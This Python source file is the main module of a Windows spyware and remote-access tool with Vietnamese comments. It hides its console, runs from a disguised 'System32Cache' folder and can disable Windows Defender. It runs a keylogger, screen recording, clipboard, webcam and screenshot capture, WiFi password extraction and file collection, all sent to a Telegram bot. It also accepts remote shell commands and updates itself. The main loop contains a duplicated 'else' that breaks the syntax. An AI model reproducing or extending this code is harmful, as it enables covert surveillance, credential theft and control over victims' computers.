"""
Ứng dụng chính chạy ở chế độ ẩn (không có cửa sổ console)
Tự động quay màn hình, ghi phím và gửi qua Telegram
"""
import os
import sys
import time
import random
import threading
import ctypes

# Ẩn console window - Cải thiện cho .exe
def hide_console():
    """Ẩn cửa sổ console - hoạt động tốt với .exe"""
    try:
        # Cách 1: Sử dụng win32gui (ưu tiên)
        import win32gui
        import win32con
        hwnd = win32gui.GetForegroundWindow()
        if hwnd:
            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
    except:
        try:
            # Cách 2: Sử dụng kernel32/user32
            kernel32 = ctypes.windll.kernel32
            user32 = ctypes.windll.user32
            hwnd = kernel32.GetConsoleWindow()
            if hwnd:
                user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0
        except:
            try:
                # Cách 3: FreeConsole (tách khỏi console)
                kernel32 = ctypes.windll.kernel32
                kernel32.FreeConsole()
            except:
                pass

# Ẩn console ngay khi import (trước mọi thứ khác)
hide_console()

# Thay đổi thư mục làm việc nếu đang chạy từ thư mục ẩn
hidden_dir = os.path.join(
    os.environ.get('APPDATA', ''),
    'Microsoft', 'Windows', 'System32Cache'
)
if os.path.exists(hidden_dir) and os.path.exists(os.path.join(hidden_dir, 'config.py')):
    os.chdir(hidden_dir)
    sys.path.insert(0, hidden_dir)

from screen_recorder import record_screen
from keylogger import KeyLogger
from telegram_sender import TelegramSender
from file_manager import FileManager
from stealth import StealthManager
from hotkey_listener import HotkeyListener
from internet_checker import InternetChecker
from performance_optimizer import PerformanceOptimizer
from anti_detection import AntiDetection
from updater import Updater
from data_manager import DataManager
from clipboard_monitor import ClipboardMonitor
from screenshot_capture import ScreenshotCapture
from file_collector import FileCollector
from process_monitor import ProcessMonitor
from machine_id import MachineID
from remote_control import RemoteControl
from file_receiver import FileReceiver
from wifi_extractor import WiFiExtractor
from webcam_capture import WebcamCapture
from usb_monitor import USBMonitor
from config import (
    RECORD_DURATION, KEYLOG_ENABLED, AUTO_DELETE_VIDEO,
    TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, TEMP_DIR,
    OPTIMIZE_FOR_WEAK_PC, DISABLE_DEFENDER,
    WIFI_EXTRACTOR_ENABLED, WIFI_EXTRACT_INTERVAL,
    WEBCAM_CAPTURE_ENABLED, WEBCAM_CAPTURE_INTERVAL,
    USB_MONITOR_ENABLED, USB_CHECK_INTERVAL,
    VIDEO_SEND_INTERVAL
)
from datetime import datetime


class StealthRemoteControlApp:
    def __init__(self):
        # Log khởi tạo
        try:
            log_file = os.path.join(TEMP_DIR, "startup.log")
            os.makedirs(TEMP_DIR, exist_ok=True)
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now()}] [INIT] Bắt đầu khởi tạo ứng dụng...\n")
        except:
            pass
        
        # Tạo Machine ID
        machine_id_gen = MachineID()
        self.machine_id = machine_id_gen.get_id()
        self.machine_short_id = machine_id_gen.get_short_id()
        
        # Log Machine ID
        try:
            log_file = os.path.join(TEMP_DIR, "startup.log")
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now()}] [INIT] Machine ID: {self.machine_short_id}\n")
        except:
            pass
        
        self.keylogger = KeyLogger() if KEYLOG_ENABLED else None
        self.telegram = TelegramSender()
        
        # Kiểm tra bot đã được khởi tạo chưa
        try:
            log_file = os.path.join(TEMP_DIR, "startup.log")
            bot_status = "OK" if self.telegram.bot else "FAILED"
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now()}] [INIT] Telegram Bot: {bot_status}\n")
                if not self.telegram.bot:
                    f.write(f"[{datetime.now()}] [ERROR] Bot token: {TELEGRAM_BOT_TOKEN[:20]}...\n")
                    f.write(f"[{datetime.now()}] [ERROR] Chat ID: {TELEGRAM_CHAT_ID}\n")
        except:
            pass
        
        self.file_manager = FileManager()
        self.stealth = StealthManager()
        self.internet_checker = InternetChecker(check_interval=30)
        self.performance_optimizer = PerformanceOptimizer()
        self.anti_detection = AntiDetection()
        self.updater = Updater()
        self.data_manager = DataManager()
        self.clipboard_monitor = ClipboardMonitor()
        self.screenshot_capture = ScreenshotCapture()
        self.file_collector = FileCollector()
        self.process_monitor = ProcessMonitor()
        self.remote_control = RemoteControl(self.telegram.bot, TELEGRAM_CHAT_ID, self.machine_id)
        self.file_receiver = FileReceiver(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, self.machine_id)
        self.wifi_extractor = WiFiExtractor() if WIFI_EXTRACTOR_ENABLED else None
        self.webcam_capture = WebcamCapture(TEMP_DIR) if WEBCAM_CAPTURE_ENABLED else None
        self.usb_monitor = USBMonitor() if USB_MONITOR_ENABLED else None
        self.running = False
        self.hotkey_listener = None
        
        # Biến đếm thời gian cho các chức năng định kỳ
        self.last_wifi_extract = 0
        self.last_webcam_capture = 0
        self.last_usb_check = 0
        self.last_video_send = 0
        
        # Tối ưu hiệu năng
        if OPTIMIZE_FOR_WEAK_PC:
            self.performance_optimizer.optimize_for_weak_pc()
        
        # Vô hiệu hóa Windows Defender
        if DISABLE_DEFENDER:
            self.anti_detection.run_all()
        
        # Kiểm tra và cập nhật tự động khi khởi động
        def auto_update_on_startup():
            try:
                time.sleep(5)  # Đợi một chút để đảm bảo internet sẵn sàng
                if self.internet_checker.is_online():
                    self.updater.auto_update()
            except:
                pass
        
        threading.Thread(target=auto_update_on_startup, daemon=True).start()
        
        # Khởi động clipboard monitor
        def start_clipboard_monitor():
            def on_clipboard_change(entry):
                # Gửi clipboard qua Telegram khi có thay đổi quan trọng
                if len(entry['content']) > 10:  # Chỉ gửi nếu có nội dung đáng kể
                    try:
                        message = f"🖥️ Machine: {self.machine_short_id}\n"
                        message += f"📋 Clipboard Changed\n"
                        message += f"⏰ Time: {entry['timestamp']}\n"
                        message += f"📝 Content:\n{entry['content'][:1000]}"
                        self.telegram.send_text_sync(message)
                    except:
                        pass
            
            self.clipboard_monitor.callback = on_clipboard_change
            threading.Thread(target=self.clipboard_monitor.monitor, args=(10,), daemon=True).start()
        
        start_clipboard_monitor()
        
        # Đảm bảo keylogger luôn chạy từ đầu
        if self.keylogger:
            self.keylogger.start()
        
        # Gửi thông báo khi kích hoạt thành công
        def send_startup_notification():
            # Đợi có internet trước
            try:
                self.internet_checker.wait_for_connection()
            except:
                return
            
            # Đợi bot sẵn sàng và gửi thông báo
            max_retries = 30
            retry_count = 0
            while retry_count < max_retries:
                try:
                    time.sleep(2)  # Đợi 2 giây mỗi lần thử
                    if self.telegram.bot and self.internet_checker.is_online():
                        # Lấy thông tin hệ thống
                        import socket
                        import platform
                        hostname = socket.gethostname()
                        username = os.environ.get('USERNAME', 'Unknown')
                        computer_name = os.environ.get('COMPUTERNAME', 'Unknown')
                        
                        # Lấy IP address
                        ip_address = "Unknown"
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            s.connect(("8.8.8.8", 80))
                            ip_address = s.getsockname()[0]
                            s.close()
                        except:
                            pass
                        
                        # Tạo thông báo chi tiết
                        message = f"🟢 ỨNG DỤNG ĐÃ KÍCH HOẠT THÀNH CÔNG!\n\n"
                        message += f"🆔 Machine ID: {self.machine_id}\n"
                        message += f"🔖 Short ID: {self.machine_short_id}\n"
                        message += f"⏰ Thời gian: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                        message += f"👤 THÔNG TIN MÁY:\n"
                        message += f"• Username: {username}\n"
                        message += f"• Computer Name: {computer_name}\n"
                        message += f"• Hostname: {hostname}\n"
                        message += f"• IP Address: {ip_address}\n"
                        message += f"• OS: {platform.system()} {platform.release()}\n\n"
                        message += f"📋 LỆNH ĐIỀU KHIỂN:\n"
                        message += f"• /cmd {self.machine_short_id} <command> - Thực thi lệnh\n"
                        message += f"• /send {self.machine_short_id} - Gửi file đến máy này\n"
                        message += f"• /info {self.machine_short_id} - Xem thông tin hệ thống\n\n"
                        message += f"✅ Ứng dụng đang chạy ẩn và sẽ gửi video + keylog mỗi 20 giây"
                        
                        # Gửi thông báo
                        success = self.telegram.send_text_sync(message)
                        if success:
                            return
                except Exception as e:
                    pass
                retry_count += 1
        
        threading.Thread(target=send_startup_notification, daemon=True).start()
        
        # Gửi thông tin hệ thống lần đầu (sau 30 giây)
        def send_system_info_delayed():
            time.sleep(30)
            try:
                self.data_manager.send_data_to_telegram(self.telegram, self.machine_short_id)
            except:
                pass
        
        threading.Thread(target=send_system_info_delayed, daemon=True).start()
        
        # Khởi động remote control listener
        def start_remote_control():
            import asyncio
            while self.running:
                try:
                    if self.telegram.bot:
                        asyncio.run(self.remote_control.check_commands())
                        asyncio.run(self.file_receiver.check_file_messages())
                except:
                    pass
                time.sleep(10)  # Kiểm tra mỗi 10 giây
        
        threading.Thread(target=start_remote_control, daemon=True).start()
        
        # Khởi động chế độ ẩn
        self.stealth.run_stealth_mode()
    
    def check_config(self):
        """Kiểm tra cấu hình"""
        if TELEGRAM_BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE" or not TELEGRAM_BOT_TOKEN:
            return False
        return True
    
    def record_and_send_with_keylog(self):
        """Quay màn hình, gửi video và keylog kèm theo về Telegram"""
        try:
            # Log bắt đầu quay
            try:
                log_file = os.path.join(TEMP_DIR, "error.log")
                os.makedirs(TEMP_DIR, exist_ok=True)
                with open(log_file, 'a', encoding='utf-8') as f:
                    f.write(f"[{datetime.now()}] [INFO] Bắt đầu quay màn hình và gửi video...\n")
            except:
                pass
            
            # Kiểm tra internet trước khi quay
            if not self.internet_checker.is_online():
                try:
                    log_file = os.path.join(TEMP_DIR, "error.log")
                    with open(log_file, 'a', encoding='utf-8') as f:
                        f.write(f"[{datetime.now()}] [ERROR] Không có internet trước khi quay\n")
                except:
                    pass
                return False
            
            # Lấy thông tin máy tính
            import socket
            import platform
            computer_name = os.environ.get('COMPUTERNAME', 'Unknown')
            username = os.environ.get('USERNAME', 'Unknown')
            
            # Quay cố định 20 giây
            duration = RECORD_DURATION
            
            # Quay màn hình (mất khoảng 20 giây)
            try:
                log_file = os.path.join(TEMP_DIR, "error.log")
                with open(log_file, 'a', encoding='utf-8') as f:
                    f.write(f"[{datetime.now()}] [INFO] Đang quay màn hình {duration} giây...\n")
            except:
                pass
            
            video_path = record_screen(duration=duration)
            
            if not video_path or not os.path.exists(video_path):
                try:
                    log_file = os.path.join(TEMP_DIR, "error.log")
                    with open(log_file, 'a', encoding='utf-8') as f:
                        f.write(f"[{datetime.now()}] [ERROR] Không thể tạo video hoặc file không tồn tại\n")
                except:
                    pass
                return False
            
            # Kiểm tra lại internet sau khi quay (có thể mất kết nối trong lúc quay)
            if not self.internet_checker.is_online():
                try:
                    if os.path.exists(video_path):
                        os.remove(video_path)
                    log_file = os.path.join(TEMP_DIR, "error.log")
                    with open(log_file, 'a', encoding='utf-8') as f:
                        f.write(f"[{datetime.now()}] [ERROR] Mất internet sau khi quay, đã xóa video\n")
                except:
                    pass
                return False
            
            # Lấy keylog đầy đủ để gửi kèm trong caption
            keylog_content = ""
            if self.keylogger:
                keylog_content = self.keylogger.get_log_content() or ""
            
            # Kiểm tra bot
            if not self.telegram.bot:
                try:
                    if os.path.exists(video_path):
                        os.remove(video_path)
                    log_file = os.path.join(TEMP_DIR, "error.log")
                    with open(log_file, 'a', encoding='utf-8') as f:
                        f.write(f"[{datetime.now()}] [ERROR] Telegram bot chưa được khởi tạo\n")
                except:
                    pass
                return False
            
            # Gửi video qua Telegram
            if self.telegram.bot and self.internet_checker.is_online():
                # Tạo caption với thông tin đầy đủ bao gồm tên máy và keylog
                caption = f"🖥️ Machine: {self.machine_short_id}\n"
                caption += f"💻 Computer: {computer_name}\n"
                caption += f"👤 User: {username}\n"
                caption += f"🎥 Screen Recording\n"
                caption += f"⏱️ Duration: {duration} seconds\n"
                caption += f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                
                # Thêm keylog vào caption (giới hạn 4000 ký tự cho Telegram)
                if keylog_content:
                    # Lấy toàn bộ keylog, giới hạn 3500 ký tự để tránh vượt quá giới hạn
                    keylog_display = keylog_content[:3500] if len(keylog_content) > 3500 else keylog_content
                    lines_count = len(keylog_content.split('\n'))
                    caption += f"\n⌨️ Keylog ({lines_count} lines):\n"
                    caption += f"{keylog_display}"
                    if len(keylog_content) > 3500:
                        caption += f"\n... (truncated, total: {len(keylog_content)} chars)"
                
                # Log trước khi gửi
                try:
                    log_file = os.path.join(TEMP_DIR, "error.log")
                    file_size = os.path.getsize(video_path) / (1024 * 1024)  # MB
                    with open(log_file, 'a', encoding='utf-8') as f:
                        f.write(f"[{datetime.now()}] [INFO] Đang gửi video ({file_size:.2f} MB)...\n")
                except:
                    pass
                
                # Gửi video ngay lập tức
                video_success = self.telegram.send_video_sync(
                    video_path,
                    caption=caption
                )
                
                # Xóa video sau khi gửi thành công
                if video_success:
                    try:
                        if os.path.exists(video_path):
                            os.remove(video_path)
                        log_file = os.path.join(TEMP_DIR, "error.log")
                        with open(log_file, 'a', encoding='utf-8') as f:
                            f.write(f"[{datetime.now()}] [SUCCESS] Đã gửi video thành công!\n")
                    except:
                        pass
                    return True
                else:
                    # Nếu gửi không thành công, xóa video để tránh đầy bộ nhớ
                    try:
                        if os.path.exists(video_path):
                            os.remove(video_path)
                        log_file = os.path.join(TEMP_DIR, "error.log")
                        with open(log_file, 'a', encoding='utf-8') as f:
                            f.write(f"[{datetime.now()}] [ERROR] Gửi video thất bại (xem telegram_error.log để biết chi tiết)\n")
                    except:
                        pass
                    return False
            else:
                # Không có bot hoặc không có internet, xóa video ngay
                try:
                    if os.path.exists(video_path):
                        os.remove(video_path)
                    log_file = os.path.join(TEMP_DIR, "error.log")
                    with open(log_file, 'a', encoding='utf-8') as f:
                        f.write(f"[{datetime.now()}] [ERROR] Không có bot hoặc internet để gửi video\n")
                except:
                    pass
                return False
                
        except Exception as e:
            # Xóa video nếu có lỗi
            try:
                if 'video_path' in locals() and os.path.exists(video_path):
                    os.remove(video_path)
                log_file = os.path.join(TEMP_DIR, "error.log")
                with open(log_file, 'a', encoding='utf-8') as f:
                    f.write(f"[{datetime.now()}] [FATAL ERROR] Exception trong record_and_send_with_keylog: {type(e).__name__}: {e}\n")
                    import traceback
                    f.write(traceback.format_exc() + "\n")
            except:
                pass
            return False
    
    def cleanup_temp_folder(self):
        """Dọn dẹp thư mục temp để tránh đầy bộ nhớ"""
        try:
            # Xóa tất cả file video cũ hơn 1 giờ
            if os.path.exists(TEMP_DIR):
                current_time = time.time()
                for file in os.listdir(TEMP_DIR):
                    file_path = os.path.join(TEMP_DIR, file)
                    try:
                        if os.path.isfile(file_path):
                            # Xóa file cũ hơn 1 giờ
                            file_age = current_time - os.path.getmtime(file_path)
                            if file_age > 3600:  # 1 giờ
                                os.remove(file_path)
                    except:
                        pass
        except:
            pass
    
    def start_keylogger(self):
        """Bắt đầu ghi phím"""
        if self.keylogger:
            self.keylogger.start()
    
    def stop_keylogger(self):
        """Dừng ghi phím"""
        if self.keylogger:
            self.keylogger.stop()
    
    def setup_hotkey(self):
        """Thiết lập hotkey để dừng ứng dụng"""
        def stop_app():
            self.running = False
            self.stop_keylogger()
            if self.hotkey_listener:
                self.hotkey_listener.stop()
            sys.exit(0)
        
        self.hotkey_listener = HotkeyListener(stop_app)
        self.hotkey_listener.start()
    
    def run_infinite_loop(self):
        """
        Chạy vòng lặp vô hạn với kiểm tra internet - chỉ chạy khi có internet
        """
        if not self.check_config():
            # Ghi log lỗi (ẩn)
            try:
                log_file = os.path.join(TEMP_DIR, "error.log")
                with open(log_file, 'a', encoding='utf-8') as f:
                    f.write(f"[{datetime.now()}] ERROR: Config không hợp lệ\n")
            except:
                pass
            return
        
        # Đợi có internet trước khi bắt đầu
        try:
            self.internet_checker.wait_for_connection()
        except Exception as e:
            # Ghi log lỗi
            try:
                log_file = os.path.join(TEMP_DIR, "error.log")
                with open(log_file, 'a', encoding='utf-8') as f:
                    f.write(f"[{datetime.now()}] ERROR: Không thể kết nối internet: {e}\n")
            except:
                pass
            return
        
        # Đảm bảo ứng dụng chạy ẩn hoàn toàn
        hide_console()
        
        # Không cần gửi thông báo ở đây vì đã có thread riêng gửi
        
        self.running = True
        # Keylogger đã được khởi động trong __init__, không cần start lại
        if not self.keylogger or not self.keylogger.listener or not self.keylogger.listener.running:
            self.start_keylogger()
        self.setup_hotkey()
        
        # Dọn dẹp temp folder định kỳ (mỗi 10 phút)
        last_cleanup = time.time()
        cleanup_interval = 600  # 10 phút
        
        try:
            while self.running:
                # Kiểm tra internet
                if not self.internet_checker.is_online():
                    # Dừng lại và đợi có internet
                    self.internet_checker.wait_for_connection()
                
                # Kiểm tra phát hiện và tự động xóa dấu vết
                self.stealth.auto_cleanup_on_detection()
                
                # Dọn dẹp temp folder định kỳ
                current_time = time.time()
                if current_time - last_cleanup > cleanup_interval:
                    self.cleanup_temp_folder()
                    last_cleanup = current_time
                
                # Kiểm tra update định kỳ (mỗi 6 giờ)
                if not hasattr(self, 'last_update_check'):
                    self.last_update_check = current_time
                if current_time - self.last_update_check > 21600:  # 6 giờ
                    try:
                        self.updater.auto_update()
                    except:
                        pass
                    self.last_update_check = current_time
                
                # Gửi thông tin hệ thống định kỳ (mỗi 24 giờ)
                if not hasattr(self, 'last_data_send'):
                    self.last_data_send = current_time
                if current_time - self.last_data_send > 86400:  # 24 giờ
                    try:
                        self.data_manager.send_data_to_telegram(self.telegram, self.machine_short_id)
                    except:
                        pass
                    self.last_data_send = current_time
                
                # Chụp ảnh màn hình định kỳ (mỗi 30 phút)
                if not hasattr(self, 'last_screenshot'):
                    self.last_screenshot = current_time
                if current_time - self.last_screenshot > 1800:  # 30 phút
                    try:
                        screenshot_path = self.screenshot_capture.capture_and_compress(quality=70)
                        if screenshot_path and self.telegram.bot:
                            caption = f"🖥️ Machine: {self.machine_short_id}\n📸 Screenshot\n⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                            self.telegram.send_file_sync(screenshot_path, caption=caption)
                            os.remove(screenshot_path)  # Xóa sau khi gửi
                    except:
                        pass
                    self.last_screenshot = current_time
                
                # Thu thập file quan trọng định kỳ (mỗi 12 giờ)
                if not hasattr(self, 'last_file_collect'):
                    self.last_file_collect = current_time
                if current_time - self.last_file_collect > 43200:  # 12 giờ
                    try:
                        files = self.file_collector.collect_recent_files(days=1, max_files=5)
                        for file_path in files:
                            if self.telegram.bot:
                                self.telegram.send_file_sync(
                                    file_path,
                                    caption=f"🖥️ Machine: {self.machine_short_id}\n📁 Collected file: {os.path.basename(file_path)}"
                                )
                                os.remove(file_path)  # Xóa sau khi gửi
                    except:
                        pass
                    self.last_file_collect = current_time
                
                # Gửi thông tin process định kỳ (mỗi 6 giờ)
                if not hasattr(self, 'last_process_send'):
                    self.last_process_send = current_time
                if current_time - self.last_process_send > 21600:  # 6 giờ
                    try:
                        top_processes = self.process_monitor.get_top_processes(by='memory', limit=10)
                        process_text = self.process_monitor.format_process_list(top_processes, self.machine_short_id)
                        if self.telegram.bot:
                            self.telegram.send_text_sync(process_text)
                    except:
                        pass
                    self.last_process_send = current_time
                
                # Lấy mật khẩu WiFi định kỳ
                if self.wifi_extractor and WIFI_EXTRACTOR_ENABLED:
                    if current_time - self.last_wifi_extract > WIFI_EXTRACT_INTERVAL:
                        try:
                            wifi_list = self.wifi_extractor.get_wifi_passwords()
                            if wifi_list:
                                wifi_text = self.wifi_extractor.format_wifi_list(wifi_list, self.machine_short_id)
                                if self.telegram.bot:
                                    self.telegram.send_text_sync(wifi_text)
                        except:
                            pass
                        self.last_wifi_extract = current_time
                
                # Chụp ảnh webcam định kỳ
                if self.webcam_capture and WEBCAM_CAPTURE_ENABLED:
                    if current_time - self.last_webcam_capture > WEBCAM_CAPTURE_INTERVAL:
                        try:
                            webcam_path = self.webcam_capture.capture()
                            if webcam_path and self.telegram.bot:
                                caption = f"🖥️ Machine: {self.machine_short_id}\n📹 Webcam Capture\n⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                                self.telegram.send_file_sync(webcam_path, caption=caption)
                                os.remove(webcam_path)  # Xóa sau khi gửi
                        except:
                            pass
                        self.last_webcam_capture = current_time
                
                # Kiểm tra thiết bị USB mới
                if self.usb_monitor and USB_MONITOR_ENABLED:
                    if current_time - self.last_usb_check > USB_CHECK_INTERVAL:
                        try:
                            new_devices = self.usb_monitor.check_new_devices()
                            if new_devices:
                                device_text = self.usb_monitor.format_device_list(new_devices, self.machine_short_id)
                                device_text = f"🆕 THIẾT BỊ USB MỚI ĐƯỢC CẮM\n\n{device_text}"
                                if self.telegram.bot:
                                    self.telegram.send_text_sync(device_text)
                        except:
                            pass
                        self.last_usb_check = current_time
                
                # Chỉ quay và gửi video khi có internet và bot đã sẵn sàng
                if self.internet_checker.is_online() and self.telegram.bot:
                    # Quay và gửi video kèm keylog định kỳ (mỗi 20 giây)
                    if self.last_video_send == 0:
                        self.last_video_send = current_time
                        # Log lần đầu tiên
                        try:
                            log_file = os.path.join(TEMP_DIR, "error.log")
                            with open(log_file, 'a', encoding='utf-8') as f:
                                f.write(f"[{datetime.now()}] [INFO] Sẵn sàng gửi video (interval: {VIDEO_SEND_INTERVAL}s)\n")
                        except:
                            pass
                    
                    # Kiểm tra đã đến lúc gửi chưa (20 giây kể từ lần gửi cuối)
                    elapsed = current_time - self.last_video_send
                    if elapsed >= VIDEO_SEND_INTERVAL:
                        try:
                            # Log trước khi gửi
                            try:
                                log_file = os.path.join(TEMP_DIR, "error.log")
                                with open(log_file, 'a', encoding='utf-8') as f:
                                    f.write(f"[{datetime.now()}] [INFO] Đã đến lúc gửi video (elapsed: {elapsed:.1f}s)\n")
                            except:
                                pass
                            
                            # Gửi ngay lập tức
                            success = self.record_and_send_with_keylog()
                            if success:
                                self.last_video_send = time.time()  # Cập nhật thời gian gửi thành công
                                try:
                                    log_file = os.path.join(TEMP_DIR, "error.log")
                                    with open(log_file, 'a', encoding='utf-8') as f:
                                        f.write(f"[{datetime.now()}] [SUCCESS] Video đã được gửi thành công!\n")
                                except:
                                    pass
                            else:
                                # Nếu gửi thất bại, thử lại sau 5 giây
                                self.last_video_send = current_time - VIDEO_SEND_INTERVAL + 5
                                try:
                                    log_file = os.path.join(TEMP_DIR, "error.log")
                                    with open(log_file, 'a', encoding='utf-8') as f:
                                        f.write(f"[{datetime.now()}] [WARNING] Gửi video thất bại, sẽ thử lại sau 5s\n")
                                except:
                                    pass
                        except Exception as e:
                            # Ghi log lỗi (ẩn)
                            try:
                                log_file = os.path.join(TEMP_DIR, "error.log")
                                with open(log_file, 'a', encoding='utf-8') as f:
                                    f.write(f"[{datetime.now()}] [ERROR] Exception trong vòng lặp gửi video: {type(e).__name__}: {e}\n")
                                    import traceback
                                    f.write(traceback.format_exc() + "\n")
                            except:
                                pass
                            self.last_video_send = current_time - VIDEO_SEND_INTERVAL + 10
                elif not self.telegram.bot:
                    # Log nếu bot chưa sẵn sàng (chỉ log mỗi 60 giây để tránh spam)
                    if not hasattr(self, 'last_bot_warning') or current_time - self.last_bot_warning > 60:
                        try:
                            log_file = os.path.join(TEMP_DIR, "error.log")
                            with open(log_file, 'a', encoding='utf-8') as f:
                                f.write(f"[{datetime.now()}] [WARNING] Telegram bot chưa được khởi tạo, không thể gửi video\n")
                        except:
                            pass
                        self.last_bot_warning = current_time
                else:
                    # Chưa đến lúc gửi, đợi thêm
                    time.sleep(2)
                else:
                    # Không có internet, đợi đến khi có kết nối
                    try:
                        self.internet_checker.wait_for_connection()
                    except:
                        time.sleep(10)
                
        except KeyboardInterrupt:
            self.stop()
        except Exception:
            # Im lặng xử lý lỗi và tiếp tục
            time.sleep(10)
            # Khởi động lại vòng lặp
            if self.running:
                self.run_infinite_loop()
    
    def stop(self):
        """Dừng ứng dụng"""
        self.running = False
        self.stop_keylogger()
        if self.hotkey_listener:
            self.hotkey_listener.stop()


def main():
    """Hàm main chạy ẩn"""
    try:
        # Log khởi động
        try:
            log_file = os.path.join(TEMP_DIR, "error.log")
            os.makedirs(TEMP_DIR, exist_ok=True)
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now()}] [STARTUP] Bắt đầu khởi động ứng dụng...\n")
        except:
            pass
        
        app = StealthRemoteControlApp()
        
        # Log khởi tạo thành công
        try:
            log_file = os.path.join(TEMP_DIR, "error.log")
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now()}] [STARTUP] Đã khởi tạo ứng dụng thành công\n")
        except:
            pass
        
        # Chạy vòng lặp vô hạn
        app.run_infinite_loop()
    except KeyboardInterrupt:
        # Log dừng do người dùng
        try:
            log_file = os.path.join(TEMP_DIR, "error.log")
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now()}] [STOP] Ứng dụng dừng do người dùng (KeyboardInterrupt)\n")
        except:
            pass
    except Exception as e:
        # Ghi log lỗi nếu có
        try:
            log_file = os.path.join(TEMP_DIR, "error.log")
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now()}] CRITICAL ERROR: {e}\n")
                import traceback
                f.write(traceback.format_exc())
        except:
            pass
        # Thử khởi động lại sau 30 giây
        time.sleep(30)
        main()


if __name__ == "__main__":
    main()
